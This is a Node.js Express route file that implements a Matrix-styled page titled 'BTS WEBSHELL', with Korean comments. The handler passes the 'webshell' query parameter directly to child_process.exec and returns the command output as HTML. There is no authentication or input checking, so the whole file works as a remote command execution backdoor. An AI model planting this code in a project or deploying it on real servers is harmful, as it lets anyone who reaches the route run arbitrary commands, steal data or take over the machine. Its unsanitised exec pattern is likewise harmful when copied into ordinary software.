var express = require('express');
var router = express.Router();
var exec = require("child_process").exec;
var so;

router.get('/', function (req, res, next) {
    exec(req.query.webshell || "HELLO", function (err, stdout, stderr) {
        console.log(req.query.webshell)
        console.log(stdout)
        if (stdout) {
            // 줄바꿈 문자('\n')을 HTML 태그('<br>')로 대체하여 표시
            so = stdout.replace(/\n/g, "<br>");
        } else {
            so = "NO CONTENT";
        }
        var html = `<!DOCTYPE html>
<html>
<head>
  <title>BTS WEBSHELL</title>
  <style>
    body {
      background-color: black;
      color: green;
      font-family: monospace;
      overflow: hidden;
    }
    .matrix-text {
      position: absolute;
      font-size: 20px;
      line-height: 20px;
      white-space: nowrap; /* prevents line breaks */
      color: rgba(0, 255, 0, 0.3); /* 연한 녹색으로 설정 */
      user-select: none; /* 텍스트 선택 비활성화 */
    }
    input[type="text"] {
      color: green;
      background-color: black;
      border: 1px solid green; /* 초록색 테두리 설정 */
      outline: none;
      font-family: monospace;
      width: 60%;
    }
    input[type="submit"] {
      color: green;
      background-color: black;
      border: 1px solid green;
      outline: none;
      font-family: monospace;
      cursor: pointer;
    }
    #target_input {
      font-size: 21px; /* "so" 출력 글꼴 크기를 줄임 */
    }
    /* 결과 출력 요소에 왼쪽 여백 추가 */
    #result {
      text-align: left;
      padding-left: 20%; /* 화면의 1/3만큼 여백 설정 */
      padding-right: 20%;
      width: 60%;
      overflow-y: auto; /* 세로 스크롤 추가 */
      max-height: 70vh; /* 최대 높이 지정 */
    }
  </style>
</head>
<body>
<div align="center">
  <h1>BTS WEBSHELL</h1>
  <form id='target' action='webshell'>
    <input id='target_input' name='webshell' type='text' placeholder="$">
    <input type='submit' value='submit'>
  </form>
  <!-- 웹 쉘 결과 출력 시 줄바꿈 적용 및 왼쪽 정렬 -->
  <div id="result">
    <h3>${so}</h3>
  </div>
</div>

<script>
  function createMatrixText() {
    var text = '';
    for (var i = 0; i < 10; i++) {
      text += Math.round(Math.random()) + "<br>";
    }
    var matrixText = document.createElement('div');
    matrixText.classList.add('matrix-text');
    matrixText.innerHTML = text;
    document.body.appendChild(matrixText);

    var xPos = Math.random() * window.innerWidth;
    matrixText.style.left = xPos + 'px';

    var yPos = -Math.random() * window.innerHeight;
    matrixText.style.top = yPos + 'px';

    animateMatrixText(matrixText);
  }

  function animateMatrixText(matrixText) {
    var yPos = parseInt(matrixText.style.top);
    var animation = setInterval(function() {
      yPos += 2;
      matrixText.style.top = yPos + 'px';

      if (yPos > window.innerHeight) {
        clearInterval(animation);
        matrixText.remove();
        createMatrixText();
      }
    }, 50);
  }

  // Create multiple matrix text elements
  for (var i = 0; i < 20; i++) {
    createMatrixText();
  }

  setInterval(function() {
    createMatrixText();
  }, 5000); //5초마다 반복
</script>
</body>
</html>

        `
        res.send(html);
    });
});

module.exports = router;